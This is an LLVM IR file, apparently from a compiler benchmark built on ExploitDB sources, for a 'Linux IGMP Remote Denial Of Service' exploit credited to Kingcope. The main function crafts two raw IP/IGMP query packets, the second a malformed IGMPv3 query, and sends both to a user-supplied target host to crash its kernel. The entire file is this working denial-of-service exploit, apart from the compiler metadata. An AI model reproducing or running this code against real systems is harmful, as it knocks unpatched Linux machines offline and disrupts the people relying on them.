; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_18378.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_18378.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i64 }
%struct.iphdr = type { i32, i32, i32, i32, i64, i64, i8*, i64, i64, i8*, i32, i64, i64 }
%struct.igmp_query = type { i32, i32, i8*, i8* }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [155 x i8] c"Linux IGMP Remote Denial Of Service (Introduced in linux-2.6.36)\0Acredits to Ben Hutchings\0Awritten by Kingcope\0ARipped & modified code written by Firestorm\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"Usage: %s <src> <dst>\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@IPPROTO_IGMP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [10 x i8] c"224.0.0.1\00", align 1
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [31 x i8] c"Sending IGMP packet: %s -> %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [21 x i8] c"Error sending packet\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"0.0.0.0\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 8
  %7 = alloca %struct.iphdr*, align 8
  %8 = alloca %struct.igmp_query*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [1500 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %12, align 4
  store i32 1, i32* %15, align 4
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 3
  br i1 %18, label %19, label %24

19:                                               ; preds = %2
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([155 x i8], [155 x i8]* @.str, i64 0, i64 0))
  %21 = load i8**, i8*** %5, align 8
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0), i8* %22)
  store i32 1, i32* %3, align 4
  br label %161

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 2
  %27 = load i8*, i8** %26, align 8
  %28 = call i64 @resolve(i8* %27)
  store i64 %28, i64* %9, align 8
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call i64 @resolve(i8* %31)
  store i64 %32, i64* %10, align 8
  %33 = getelementptr inbounds [1500 x i8], [1500 x i8]* %16, i64 0, i64 0
  %34 = call i32 @memset(i8* %33, i32 0, i32 1500)
  %35 = bitcast [1500 x i8]* %16 to %struct.iphdr*
  store %struct.iphdr* %35, %struct.iphdr** %7, align 8
  %36 = getelementptr inbounds [1500 x i8], [1500 x i8]* %16, i64 0, i64 88
  %37 = bitcast i8* %36 to %struct.igmp_query*
  store %struct.igmp_query* %37, %struct.igmp_query** %8, align 8
  %38 = load i64, i64* %9, align 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  %40 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %39, i32 0, i32 0
  store i64 %38, i64* %40, align 8
  %41 = load i32, i32* @AF_INET, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i32 %41, i32* %42, align 8
  %43 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 0
  store i32 7, i32* %44, align 8
  %45 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %46 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %45, i32 0, i32 1
  store i32 4, i32* %46, align 4
  %47 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %48 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %47, i32 0, i32 12
  store i64 0, i64* %48, align 8
  %49 = call i8* @htons(i32 96)
  %50 = ptrtoint i8* %49 to i32
  %51 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 2
  store i32 %50, i32* %52, align 8
  %53 = call i8* @htons(i32 18277)
  %54 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 6
  store i8* %53, i8** %55, align 8
  %56 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %57 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %56, i32 0, i32 11
  store i64 0, i64* %57, align 8
  %58 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %59 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %58, i32 0, i32 3
  store i32 1, i32* %59, align 4
  %60 = load i32, i32* @IPPROTO_IGMP, align 4
  %61 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %62 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %61, i32 0, i32 10
  store i32 %60, i32* %62, align 8
  %63 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %64 = bitcast %struct.iphdr* %63 to i16*
  %65 = call i8* @in_chksum(i16* %64, i32 88)
  %66 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %67 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %66, i32 0, i32 9
  store i8* %65, i8** %67, align 8
  %68 = load i64, i64* %10, align 8
  %69 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %70 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %69, i32 0, i32 4
  store i64 %68, i64* %70, align 8
  %71 = load i64, i64* %9, align 8
  %72 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %73 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %72, i32 0, i32 5
  store i64 %71, i64* %73, align 8
  %74 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %75 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %74, i32 0, i32 8
  store i64 0, i64* %75, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %77 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %76, i32 0, i32 7
  store i64 0, i64* %77, align 8
  %78 = load %struct.igmp_query*, %struct.igmp_query** %8, align 8
  %79 = getelementptr inbounds %struct.igmp_query, %struct.igmp_query* %78, i32 0, i32 0
  store i32 17, i32* %79, align 8
  %80 = load %struct.igmp_query*, %struct.igmp_query** %8, align 8
  %81 = getelementptr inbounds %struct.igmp_query, %struct.igmp_query* %80, i32 0, i32 1
  store i32 255, i32* %81, align 4
  %82 = call i8* @inet_addr(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  %83 = load %struct.igmp_query*, %struct.igmp_query** %8, align 8
  %84 = getelementptr inbounds %struct.igmp_query, %struct.igmp_query* %83, i32 0, i32 3
  store i8* %82, i8** %84, align 8
  %85 = load %struct.igmp_query*, %struct.igmp_query** %8, align 8
  %86 = getelementptr inbounds %struct.igmp_query, %struct.igmp_query* %85, i32 0, i32 2
  store i8* null, i8** %86, align 8
  %87 = load %struct.igmp_query*, %struct.igmp_query** %8, align 8
  %88 = bitcast %struct.igmp_query* %87 to i16*
  %89 = call i8* @in_chksum(i16* %88, i32 8)
  %90 = load %struct.igmp_query*, %struct.igmp_query** %8, align 8
  %91 = getelementptr inbounds %struct.igmp_query, %struct.igmp_query* %90, i32 0, i32 2
  store i8* %89, i8** %91, align 8
  %92 = load i32, i32* @AF_INET, align 4
  %93 = load i32, i32* @SOCK_RAW, align 4
  %94 = load i32, i32* @IPPROTO_RAW, align 4
  %95 = call i32 @socket(i32 %92, i32 %93, i32 %94)
  store i32 %95, i32* %11, align 4
  %96 = load i32, i32* %11, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

98:                                               ; preds = %24
  store i32 1, i32* %3, align 4
  br label %161

99:                                               ; preds = %24
  %100 = load i8**, i8*** %5, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 1
  %102 = load i8*, i8** %101, align 8
  %103 = load i8**, i8*** %5, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 2
  %105 = load i8*, i8** %104, align 8
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i8* %102, i8* %105)
  %107 = load i32, i32* %11, align 4
  %108 = bitcast [1500 x i8]* %16 to i8**
  %109 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %110 = call i32 @sendto(i32 %107, i8** %108, i32 96, i32 0, %struct.sockaddr* %109, i32 16)
  %111 = icmp eq i32 %110, -1
  br i1 %111, label %112, label %115

112:                                              ; preds = %99
  %113 = call i32 @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %114 = call i32 @exit(i32 -1) #3
  unreachable

115:                                              ; preds = %99
  %116 = load i32, i32* %11, align 4
  %117 = call i32 @close(i32 %116)
  %118 = load i32, i32* @AF_INET, align 4
  %119 = load i32, i32* @SOCK_RAW, align 4
  %120 = load i32, i32* @IPPROTO_RAW, align 4
  %121 = call i32 @socket(i32 %118, i32 %119, i32 %120)
  store i32 %121, i32* %11, align 4
  %122 = load i32, i32* %11, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

124:                                              ; preds = %115
  store i32 1, i32* %3, align 4
  br label %161

125:                                              ; preds = %115
  %126 = call i8* @htons(i32 18278)
  %127 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 6
  store i8* %126, i8** %128, align 8
  %129 = load %struct.iphdr*, %struct.iphdr** %7, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i32 0, i32 2
  store i32 100, i32* %130, align 8
  %131 = load %struct.igmp_query*, %struct.igmp_query** %8, align 8
  %132 = getelementptr inbounds %struct.igmp_query, %struct.igmp_query* %131, i32 0, i32 0
  store i32 17, i32* %132, align 8
  %133 = load %struct.igmp_query*, %struct.igmp_query** %8, align 8
  %134 = getelementptr inbounds %struct.igmp_query, %struct.igmp_query* %133, i32 0, i32 1
  store i32 0, i32* %134, align 4
  %135 = call i8* @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %136 = load %struct.igmp_query*, %struct.igmp_query** %8, align 8
  %137 = getelementptr inbounds %struct.igmp_query, %struct.igmp_query* %136, i32 0, i32 3
  store i8* %135, i8** %137, align 8
  %138 = load %struct.igmp_query*, %struct.igmp_query** %8, align 8
  %139 = getelementptr inbounds %struct.igmp_query, %struct.igmp_query* %138, i32 0, i32 2
  store i8* null, i8** %139, align 8
  %140 = load %struct.igmp_query*, %struct.igmp_query** %8, align 8
  %141 = bitcast %struct.igmp_query* %140 to i16*
  %142 = call i8* @in_chksum(i16* %141, i32 12)
  %143 = load %struct.igmp_query*, %struct.igmp_query** %8, align 8
  %144 = getelementptr inbounds %struct.igmp_query, %struct.igmp_query* %143, i32 0, i32 2
  store i8* %142, i8** %144, align 8
  %145 = load i8**, i8*** %5, align 8
  %146 = getelementptr inbounds i8*, i8** %145, i64 1
  %147 = load i8*, i8** %146, align 8
  %148 = load i8**, i8*** %5, align 8
  %149 = getelementptr inbounds i8*, i8** %148, i64 2
  %150 = load i8*, i8** %149, align 8
  %151 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i8* %147, i8* %150)
  %152 = load i32, i32* %11, align 4
  %153 = bitcast [1500 x i8]* %16 to i8**
  %154 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %155 = call i32 @sendto(i32 %152, i8** %153, i32 100, i32 0, %struct.sockaddr* %154, i32 16)
  %156 = icmp eq i32 %155, -1
  br i1 %156, label %157, label %160

157:                                              ; preds = %125
  %158 = call i32 @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %159 = call i32 @exit(i32 -1) #3
  unreachable

160:                                              ; preds = %125
  store i32 0, i32* %3, align 4
  br label %161

161:                                              ; preds = %160, %124, %98, %19
  %162 = load i32, i32* %3, align 4
  ret i32 %162
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @resolve(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i8* @in_chksum(i16*, i32) #1

declare dso_local i8* @inet_addr(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @sendto(i32, i8**, i32, i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
